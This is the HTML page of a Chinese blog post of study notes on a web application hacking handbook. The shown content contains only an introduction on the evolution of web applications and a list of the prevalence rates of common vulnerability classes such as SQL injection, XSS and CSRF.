

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="ccw">
  <meta name="keywords" content="">
  
    <meta name="description" content="1. Web应用程序案例与风险Web应用程序的发展历程早期Web服务器仅提供静态内容，可以被任意人公开访问；今天则完全变了，Web服务器可以提供非常丰富的服务； Web应用程序安全虽然很多站点声明自己是安全的，但实际上并非如此。超过一半以上的安全存在各式各样的漏洞；  不完善的身份验证措施：62%； 不完善的访问控制措施：71%； SQL 注入：32%； 跨站点脚本：94%； 信息泄露：78%；">
<meta property="og:type" content="article">
<meta property="og:title" content="黑客攻防技术宝典">
<meta property="og:url" content="http://example.com/2020/12/05/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E5%AE%9D%E5%85%B8/index.html">
<meta property="og:site_name" content="Ccw&#39;s Blogs">
<meta property="og:description" content="1. Web应用程序案例与风险Web应用程序的发展历程早期Web服务器仅提供静态内容，可以被任意人公开访问；今天则完全变了，Web服务器可以提供非常丰富的服务； Web应用程序安全虽然很多站点声明自己是安全的，但实际上并非如此。超过一半以上的安全存在各式各样的漏洞；  不完善的身份验证措施：62%； 不完善的访问控制措施：71%； SQL 注入：32%； 跨站点脚本：94%； 信息泄露：78%；">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195257.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210194833.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210194951.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195019.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195046.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195105.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195128.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201221193400.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210112082331.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210112082743.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210112084106.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210112085804.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210226074911.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210226074719.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210226080043.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210302090153.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210302092057.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210303074105.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210303080849.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210303080801.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210305085037.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210306114628.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210306120830.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210309084620.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210311073209.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210311081839.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210312195839.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210312195854.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210314090708.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210315081459.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210315081927.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210315085442.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210316090308.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210317082813.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210317090210.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210318090959.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210318091231.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210318091127.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319083904.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319091713.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319091725.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319091738.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319091819.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210319092517.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210323082444.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210323082620.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210323082841.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210324083708.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210325074852.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210325075157.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210325075737.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210326073933.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210326073959.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210327085857.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210327091435.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329081722.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329091008.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329091051.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329091249.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329091225.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330072455.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330072530.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330072820.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330074650.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330074732.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330080354.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330080657.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330081223.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330081301.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210331090602.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210410092712.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210410093438.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210412084632.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210413072251.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210413072426.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210413075720.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210413080927.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414070557.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414071617.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414072441.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414074756.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414075345.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414075539.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414080644.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414080823.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414085214.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414085239.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414085459.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210415080752.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210415081853.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210420085013.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210421073239.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210421074334.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210421081648.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210425090250.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426085159.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426085547.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426090057.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426090625.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426091222.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210426091427.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427081806.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427082026.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427084503.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427085119.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427085806.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427085951.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427090537.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427090659.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210427090748.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428073357.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428073409.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428073528.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428073905.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428074051.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428074033.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428074218.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428074436.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428075230.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081146.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081352.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081535.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081653.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081829.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081851.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428081914.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428082229.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428082826.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428083130.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428083157.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428083436.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428084414.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428085113.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428085129.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428090257.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210428090402.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429073634.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429073652.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429073720.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429073846.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429074224.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429074253.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429074352.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429074800.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429075147.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429082649.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429082838.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429083021.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429083712.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429084953.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430072702.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430073115.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430073257.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430073626.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430075150.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430075304.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430075936.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430080059.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430080645.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430081547.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430081643.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430083707.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430084420.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210501081455.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210501081508.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210501084142.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210501084727.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210507072807.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210508083154.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210508085054.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210509082954.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210509084554.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210512081913.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210512082646.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210513074745.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210514075045.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210514082819.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210515083421.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210519085415.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210521083256.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523081043.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083138.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083218.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083343.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083422.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083440.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083509.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083847.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210525084953.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210527074810.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528081402.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528081805.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528081913.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528083729.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528085245.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528090928.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528091333.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210528091747.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529154302.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529154514.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529154755.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529154822.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529155008.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529155127.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529155732.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529160333.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529160545.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529173848.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529175548.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210601085820.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210601090249.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210601090411.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210601090447.png">
<meta property="og:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210602072751.png">
<meta property="article:published_time" content="2020-12-05T02:18:00.000Z">
<meta property="article:modified_time" content="2024-09-21T12:41:07.630Z">
<meta property="article:author" content="ccw">
<meta property="article:tag" content="软件">
<meta property="article:tag" content="安全">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201210195257.png">
  
  
  
  <title>黑客攻防技术宝典 - Ccw&#39;s Blogs</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Ccw's Blogs" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="黑客攻防技术宝典"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2020-12-05 10:18" pubdate>
          2020年12月5日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          138k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          1150 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">黑客攻防技术宝典</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="1-Web应用程序案例与风险"><a href="#1-Web应用程序案例与风险" class="headerlink" title="1. Web应用程序案例与风险"></a>1. Web应用程序案例与风险</h1><h2 id="Web应用程序的发展历程"><a href="#Web应用程序的发展历程" class="headerlink" title="Web应用程序的发展历程"></a>Web应用程序的发展历程</h2><p>早期Web服务器仅提供静态内容，可以被任意人公开访问；今天则完全变了，Web服务器可以提供非常丰富的服务；</p>
<h2 id="Web应用程序安全"><a href="#Web应用程序安全" class="headerlink" title="Web应用程序安全"></a>Web应用程序安全</h2><p>虽然很多站点声明自己是安全的，但实际上并非如此。超过一半以上的安全存在各式各样的漏洞；</p>
<ul>
<li>不完善的身份验证措施：62%；</li>
<li>不完善的访问控制措施：71%；</li>
<li>SQL 注入：32%；</li>
<li>跨站点脚本：94%；</li>
<li>信息泄露：78%；</li>
<li>跨站点请求伪造：92%；</li>
</ul>
